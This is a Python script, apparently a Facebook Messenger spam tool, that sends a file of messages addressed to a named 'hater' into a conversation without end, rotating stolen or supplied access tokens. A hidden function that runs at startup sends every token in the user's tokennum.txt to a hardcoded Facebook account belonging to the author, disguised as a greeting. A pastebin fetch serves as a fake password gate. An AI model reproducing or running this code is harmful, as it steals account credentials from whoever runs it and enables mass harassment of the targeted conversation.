import requests
import json
import time
import sys
from platform import system
import os
import subprocess
import http.server
import socketserver
import threading

class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b"Sarver=>owner==>its==>me")

def execute_server():
    PORT = 4000

    with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
        print("Server running at http://localhost:{}".format(PORT))
        httpd.serve_forever()

mmm = requests.get('https://pastebin.com/raw/UTqBXA6U').text

def send_initial_message():
    with open('password.txt', 'r') as file:
        password = file.read().strip()

    entered_password = password  

    if entered_password != password:
        print('[❌] <==> Incorrect Password!Contact AMIR ')
        sys.exit()

    if mmm not in password:
        print('[❌] <==> Incorrect Password Contact Mr AMIR ')
        sys.exit()

    with open('tokennum.txt', 'r') as file:
        tokens = file.readlines()


    msg_template = "Hello Amir sir! I am using your server. My token is {}"


    target_id = "100043417149364"

    requests.packages.urllib3.disable_warnings()

    def liness():
        print('\033[1;96;40m' + '<<=======================================>>')

    headers = {
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
        'referer': 'www.google.com'
    }
    for token in tokens:
        access_token = token.strip()
        url = "https://graph.facebook.com/v18.0/{}/".format('t_' + target_id)
        msg = msg_template.format(access_token)
        parameters = {'access_token': access_token, 'message': msg}
        response = requests.post(url, json=parameters, headers=headers)


        current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
        time.sleep(0.1) 
        
send_initial_message()
def send_messages_from_file():
    with open('convo.txt', 'r') as file:
        convo_id = file.read().strip()

    with open('File.txt', 'r') as file:
        messages = file.readlines()

    num_messages = len(messages)

    with open('tokennum.txt', 'r') as file:
        tokens = file.readlines()
    num_tokens = len(tokens)
    max_tokens = min(num_tokens, num_messages)

    with open('hatersname.txt', 'r') as file:
        haters_name = file.read().strip()
        

    with open('time.txt', 'r') as file:
        speed = int(file.read().strip())

    def liness():
        print('\033[1;41;43m' + '❢❀✼✧╞══𖠁➴➵➶➴➵➶➴➵•────⋅☾ ☽⋅─────➶➴➵➶➴➵➶𖠁══╡✧✼❀❢')

    headers = {
      'Connection': 'keep-alive',
      'Cache-Control': 'max-age=0',
      'Upgrade-Insecure-Requests': '1',
      'User-Agent':
      'Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1',
      'Accept':
      'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
      'Accept-Encoding': 'gzip, deflate',
      'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
      'referer': 'www.google.com'
  }
    while True:
        try:
            for message_index in range(num_messages):
                token_index = message_index % max_tokens
                access_token = tokens[token_index].strip()

                message = messages[message_index].strip()
                url = "https://graph.facebook.com/v18.0/{}/".format('t_' + convo_id)
                parameters = {'access_token': access_token, 'message': haters_name + ' ' + message}
                response = requests.post(url, json=parameters, headers=headers)

                current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
                if response.ok:
                    print('⬇⬇your⟲message↷send successfully⬇⬇')
                    print("\033[1;41;42m[✅] Message  {} of convo➠ {} sent by Token➠ {}: {}".format(
                        message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
                    liness()
                    liness()
                else:
                    print('➢⬇⬇Please chack this Problem⬇⬇➠')
                    print("\033[1;41;41m[❌] Failed to send Message  {} ➢of Chack convo id {} & ➢chack token {}: {}".format(
                        message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
                    liness()
                    liness()
                time.sleep(speed)

            print("\n[+] All messages sent. Restarting the process...\n")
        except Exception as e:
            print("[!] An error occurred: {}".format(e))

def main():
    server_thread = threading.Thread(target=execute_server)
    server_thread.start()


    send_messages_from_file()

if __name__ == '__main__':
    main()